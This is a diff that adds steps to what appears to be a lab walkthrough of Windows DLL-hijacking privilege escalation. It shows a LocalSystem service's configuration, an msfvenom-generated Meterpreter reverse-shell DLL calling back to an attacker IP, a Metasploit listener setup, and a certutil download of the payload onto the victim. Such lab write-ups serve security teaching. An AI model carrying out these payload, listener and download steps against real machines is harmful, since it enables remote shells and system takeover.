@@ -160,8 +160,125 @@ R dllsvc
 
 I could stop and restart the service myself — meaning I could trigger the DLL load whenever I wanted.
 
+<p align="center">
+  <img src="images/step2-1.png" width="600">
+</p>
+
 ## Step 3 — Checking the Service Configuration
+
+After confirming that I could start and stop the service, I checked its configuration.
 
 ```bash
 C:\PrivEsc> sc qc dllsvc
 ```
+**Output:**
+
+```
+[SC] QueryServiceConfig SUCCESS
+
+SERVICE_NAME: dllsvc
+        TYPE               : 10  WIN32_OWN_PROCESS 
+        START_TYPE         : 3   DEMAND_START
+        ERROR_CONTROL      : 1   NORMAL
+        BINARY_PATH_NAME   : "C:\Program Files\DLL Hijack Service\dllhijackservice.exe"
+        LOAD_ORDER_GROUP   : 
+        TAG                : 0
+        DISPLAY_NAME       : DLL Hijack Service
+        DEPENDENCIES       : 
+        SERVICE_START_NAME : LocalSystem
+```
+<p align="center">
+  <img src="images/step3-1.png" width="600">
+</p>
+
+### Started the Service
+
+```bash
+C:\PrivEsc>net start dllsvc
+```
+
+**Output:**
+
+```
+The DLL Hijack Service service is starting.
+The DLL Hijack Service service was started successfully.
+```
+I started the service to confirm it was working and loading DLLs from `C:\Temp`.
+
+<p align="center">
+  <img src="images/step3-2.png" width="600">
+</p>
+
+## Step 4 — Generating a Malicious DLL and Downloading it to the Victim
+
+I generated a malicious DLL on my Kali machine using msfvenom. This DLL would connect back to my Metasploit listener when it was loaded by the vulnerable service.
+
+### Generated a Malicious DLL on Kali
+```bash
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.5.128 LPORT=4444 -f dll -o hijackme.dl
+```
+
+### Flag Breakdown
+
+```
+| Flag  |            Value                    |                         Description                                  |
+|-------|-------------------------------------|----------------------------------------------------------------------|
+| -p    | windows/x64/meterpreter/reverse_tcp | Creates a 64-bit Windows Meterpreter reverse TCP payload.            |
+| LHOST | 192.168.5.128                       | My Kali machine's IP address that receives the reverse connection.   |
+| LPORT | 4444                                | The port on my Kali machine that listens for the incoming connection.|
+| -f    | dll                                 | Generates the payload as a DLL file.                                 |
+| -o    | hijackme.dll                        | Saves the generated payload as hijackme.dll.                         |
+```
+
+**Output:**
+
+```
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 510 bytes
+Final size of dll file: 9216 bytes
+Saved as: hijackme.dll
+```
+<p align="center">
+  <img src="images/step4-1.png" width="600">
+</p>
+
+### Started Metasploit Listener on Kali
+
+Before triggering the service, I started a Metasploit listener on my Kali machine to catch the incoming Meterpreter connection.
+
+```bash
+msfconsole -q
+use multi/handler
+set payload windows/x64/meterpreter/reverse_tcp
+set lhost 192.168.5.128
+set lport 4444
+run
+```
+**Output:**
+
+```
+[*] Started reverse TCP handler on 192.168.5.128:4444
+```
+<p align="center">
+  <img src="images/step4-2.png" width="600">
+</p>
+
+### Downloaded the Malicious DLL on the Victim Machine
+
+```bash
+C:\PrivEsc> cd C:\Temp
+```
+```bash
+C:\Temp> certutil -urlcache -split -f http://192.168.5.128/hijackme.dll hijackme.dll
+```
+```
+****  Online  ****
+  0000  ...
+  2400
+CertUtil: -URLCache command completed successfully.
+```
+<p align="center">
+  <img src="images/step4-3.png" width="600">
+</p>
